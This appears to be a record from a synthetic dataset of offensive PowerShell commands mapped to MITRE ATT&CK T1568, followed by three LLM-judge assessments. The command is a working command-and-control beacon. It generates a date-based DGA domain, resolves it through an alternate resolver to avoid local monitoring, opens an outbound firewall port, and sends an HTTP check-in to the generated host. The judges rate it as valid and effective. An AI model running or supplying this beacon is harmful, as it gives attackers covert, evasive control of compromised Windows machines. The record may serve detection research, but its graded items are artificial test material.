command: Invoke-Command -ScriptBlock { $dom=('ns{0}.hopdns.org' -f ((Get-Date).ToString('ddHH'))); ipconfig /flushdns | Out-Null; $a=Resolve-DnsName $dom -Type A -DnsOnly -NoHostsFile -Server '1.0.0.1' -ErrorAction SilentlyContinue; if($a){ $port=@(8081,8444,9001) | Get-Random; netsh advfirewall firewall add rule name=('out_'+$port) dir=out action=allow protocol=TCP remoteport=$port | Out-Null; Invoke-WebRequest -Uri ('http://{0}:{1}/b' -f $dom,$port) -Headers @{ Host=$dom } -TimeoutSec (Get-Random -Min 4 -Max 9) -UseBasicParsing } }
explanation: Flushes caches and performs DNS-only resolution via an alternate resolver, randomizes the egress port from a small set of uncommon ports, and initiates a benign-looking HTTP request.
rationale_steps: Avoid cached or hosts-file-influenced answers by forcing DNS-only resolution.
Resolve a DGA domain using a non-default resolver.
Allow outbound connectivity on a randomly chosen uncommon port.
Send a check-in using Host header routing and randomized timeout.

llm_judgments.syntactic_justification: PowerShell scriptblock is well-formed with balanced delimiters and valid cmdlets/parameters; operators and pipelines are correctly used.
llm_judgments.semantic_justification: Implements time-based domain generation with DNS-only resolution via an alternate resolver and performs an HTTP beacon on randomized ports, aligning with T1568, though adding a firewall rule likely requires admin privileges contrary to the stated none.

llm_judgments.syntactic_justification: The command is perfectly well-formed with balanced braces, parentheses, and quotes, valid PowerShell syntax throughout, proper use of format operators, pipeline separators, and all cmdlet flags are syntactically correct.
llm_judgments.semantic_justification: The command precisely implements T1568 dynamic resolution by algorithmically generating a domain name from the current date/hour (a time-based DGA), flushing DNS cache to avoid detection artifacts, using an alternate DNS resolver to bypass local monitoring, randomizing egress ports from an uncommon set, adding a firewall rule to permit the connection, and beaconing via HTTP with a randomized timeout to mimic legitimate traffic patterns.

llm_judgments.syntactic_justification: The command uses correct PowerShell syntax, properly nested braces, and valid cmdlet parameters throughout.
llm_judgments.semantic_justification: The command effectively demonstrates time-based dynamic resolution, though the inclusion of a 'netsh' rule requires administrative privileges not specified in the metadata.
